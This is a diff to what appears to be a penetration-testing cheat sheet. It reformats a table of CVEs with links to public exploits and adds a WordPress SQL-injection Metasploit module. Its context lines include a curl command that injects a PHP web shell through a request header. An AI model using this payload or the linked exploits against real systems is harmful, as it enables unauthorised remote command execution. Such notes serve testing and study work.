@@ -418,12 +418,14 @@ GET/POST parameters
 ## Vulnerabilities
 |Software|Version|CVE|Link|
 |---|---|---|---|
-|Docker Desktop for Windows|4.44.2|CVE-2025-9074|https://github.com/BridgerAlderson/CVE-2025-9074-PoC|
-|Cacti|1.2.29|CVE-2025-24367|https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC|
-|pkexec||CVE-2021-4034|https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures|
-|vsftpd|2.3.4|CVE-2011-2523|https://www.exploit-db.com/exploits/49757|
+|Docker Desktop for Windows|4.44.2|CVE-2025-9074|[CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)|
+|Cacti|1.2.29|CVE-2025-24367|[CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)|
+|pkexec||CVE-2021-4034|[pwnkit](https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures)|
+|vsftpd|2.3.4|CVE-2011-2523|[Exploitdb](https://www.exploit-db.com/exploits/49757)|
 |Apache|2.4.49|CVE-2021-41773|see url path traversal|
-|Grafana|8.3.0 and more|CVE-2021-43798|https://www.vulncheck.com/blog/grafana-cve-2021-43798|
+|Grafana|8.3.0 and more|CVE-2021-43798|[grafana-cve-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798)|
+|Perfect Survey (Wordpress)|<1.5.2|CVE-2021-24762|[metasploit-module](https://github.com/aaryan-11-x/My-Metasploit-Modules/blob/main/CVE-2021-24762%3A%20WordPress%20Plugin%20Perfect%20Survey%201.5.1%20-%20SQLi%20(Unauthenticated)/wp_perfect_survey_sqli.rb)|
+
 
 ## Quote escapes
 	curl -H 'Custom-Header: <?php echo system($_GET['\''cmd'\'']); ?>'
